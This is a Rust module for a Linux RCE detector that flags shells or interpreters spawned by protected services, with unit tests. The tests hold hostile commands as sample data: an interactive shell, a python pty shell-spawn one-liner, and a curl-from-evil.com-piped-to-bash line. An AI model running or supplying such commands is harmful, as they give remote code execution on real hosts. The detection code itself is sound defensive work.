use crate::analyzer::process_context::ProcessInspector;
use crate::config::RceDetectorConfig;
use std::collections::HashSet;
use std::fs;

#[derive(Debug, Clone)]
pub struct RceAlert {
    pub parent_service: String,
    pub parent_pid: u32,
    pub child_cmd: String,
    pub child_pid: u32,
}

pub struct RceDetector {
    config: RceDetectorConfig,
    protected_services: HashSet<String>,
    alerted_pids: std::sync::Mutex<HashSet<u32>>,
}

impl RceDetector {
    pub fn new(config: RceDetectorConfig) -> Self {
        let protected_services = config.protected_services.iter().cloned().collect();
        Self {
            config,
            protected_services,
            alerted_pids: std::sync::Mutex::new(HashSet::new()),
        }
    }

    /// Scans active processes in /proc to detect anomalous parent-child relationships.
    pub fn scan_anomalies(&self) -> Vec<RceAlert> {
        let mut alerts = Vec::new();

        let proc_dir = match fs::read_dir("/proc") {
            Ok(d) => d,
            Err(_) => return alerts,
        };

        let mut active_pids = HashSet::new();

        for entry in proc_dir.filter_map(|e| e.ok()) {
            let file_name = entry.file_name();
            let name_str = file_name.to_string_lossy();

            if let Ok(pid) = name_str.parse::<u32>() {
                active_pids.insert(pid);

                if let Some(ppid) = ProcessInspector::get_parent_pid(pid) {
                    let parent_comm = ProcessInspector::get_process_name(ppid);
                    let parent_exe = ProcessInspector::get_process_exe(ppid);

                    if self.is_protected_service(parent_comm.as_deref(), parent_exe.as_deref()) {
                        let child_exe = ProcessInspector::get_process_exe(pid);
                        let child_comm = ProcessInspector::get_process_name(pid);
                        let raw_cmd = ProcessInspector::get_process_cmdline(pid)
                            .or_else(|| child_exe.clone())
                            .or_else(|| child_comm.clone())
                            .unwrap_or_default();

                        if self.is_forbidden_child(
                            child_exe.as_deref(),
                            child_comm.as_deref(),
                            &raw_cmd,
                        ) {
                            // Ignora comandos que contenham padrões permitidos explicitamente na whitelist
                            if self.is_allowed_child(&raw_cmd) {
                                continue;
                            }

                            let child_cmd: String = raw_cmd
                                .chars()
                                .map(|c| {
                                    if c.is_control() || c == '\n' || c == '\r' {
                                        ' '
                                    } else {
                                        c
                                    }
                                })
                                .collect();

                            let parent_name = parent_comm
                                .or_else(|| {
                                    parent_exe.and_then(|p| {
                                        p.split('/').next_back().map(|s| s.to_string())
                                    })
                                })
                                .unwrap_or_else(|| format!("PID:{}", ppid));

                            // RUST-05: acquire lock once, check and insert atomically to eliminate
                            // internal TOCTOU between separate check and insert lock acquisitions.
                            if let Ok(mut alerted) = self.alerted_pids.lock() {
                                if alerted.contains(&pid) {
                                    continue;
                                }
                                alerted.insert(pid);
                            }

                            alerts.push(RceAlert {
                                parent_service: parent_name,
                                parent_pid: ppid,
                                child_cmd,
                                child_pid: pid,
                            });
                        }
                    }
                }
            }
        }

        // Limpa PIDs terminados para liberar memória
        if let Ok(mut alerted) = self.alerted_pids.lock() {
            alerted.retain(|p| active_pids.contains(p));
        }

        alerts
    }

    fn is_protected_service(&self, comm: Option<&str>, exe: Option<&str>) -> bool {
        for protected in &self.protected_services {
            let protected_name = protected.strip_prefix('/').unwrap_or(protected);
            let protected_bin = protected_name
                .split('/')
                .next_back()
                .unwrap_or(protected_name);

            if let Some(c) = comm {
                if c == protected_bin || c == protected {
                    return true;
                }
            }
            if let Some(e) = exe {
                let binary_name = e.split('/').next_back().unwrap_or(e);
                if binary_name == protected_bin || e == protected {
                    return true;
                }
            }
        }
        false
    }

    fn is_forbidden_child(&self, exe: Option<&str>, comm: Option<&str>, cmd: &str) -> bool {
        let exe_bin = exe.and_then(|e| e.split('/').next_back()).unwrap_or("");
        let exe_path = exe.unwrap_or("");
        let comm_str = comm.unwrap_or("");

        for forbidden in &self.config.forbidden_children {
            let f = forbidden.as_str();

            // 1. Wildcard pattern (e.g. /usr/bin/python*, nc*)
            if let Some(prefix) = f.strip_suffix('*') {
                let prefix_bin = prefix.split('/').next_back().unwrap_or(prefix);
                if exe_path.starts_with(prefix)
                    || exe_bin.starts_with(prefix_bin)
                    || comm_str.starts_with(prefix_bin)
                    || cmd.starts_with(prefix)
                {
                    return true;
                }
            } else {
                let forbidden_bin = f.split('/').next_back().unwrap_or(f);
                if exe_path == f
                    || exe_bin == forbidden_bin
                    || comm_str == forbidden_bin
                    || cmd.starts_with(f)
                    || cmd.starts_with(forbidden_bin)
                {
                    return true;
                }
            }
        }
        false
    }

    fn is_allowed_child(&self, cmd: &str) -> bool {
        for pattern in &self.config.allowed_cmd_patterns {
            if !pattern.is_empty() && cmd.contains(pattern) {
                return true;
            }
        }
        false
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::config::RceDetectorConfig;

    #[test]
    fn test_forbidden_child_detection() {
        let config = RceDetectorConfig::default();
        let detector = RceDetector::new(config);

        assert!(detector.is_forbidden_child(Some("/bin/sh"), Some("sh"), "sh -i"));
        assert!(detector.is_forbidden_child(
            Some("/usr/bin/python3"),
            Some("python3"),
            "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'"
        ));
        assert!(!detector.is_forbidden_child(
            Some("/usr/sbin/sendmail"),
            Some("sendmail"),
            "sendmail -t"
        ));
    }

    #[test]
    fn test_allowed_cmd_patterns_whitelist() {
        let mut config = RceDetectorConfig::default();
        config.allowed_cmd_patterns = vec!["kong.cmd.init".to_string(), "resty".to_string()];
        let detector = RceDetector::new(config);

        let kong_cmd = "sh -c -- resty --main-conf '' -e 'require(\"kong.cmd.init\")(\"health\")'";
        assert!(detector.is_forbidden_child(Some("/bin/sh"), Some("sh"), kong_cmd));
        assert!(detector.is_allowed_child(kong_cmd));

        let malicious_cmd = "sh -c -- /usr/bin/curl http://evil.com/shell.sh | bash";
        assert!(detector.is_forbidden_child(Some("/bin/sh"), Some("sh"), malicious_cmd));
        assert!(!detector.is_allowed_child(malicious_cmd));
    }
}
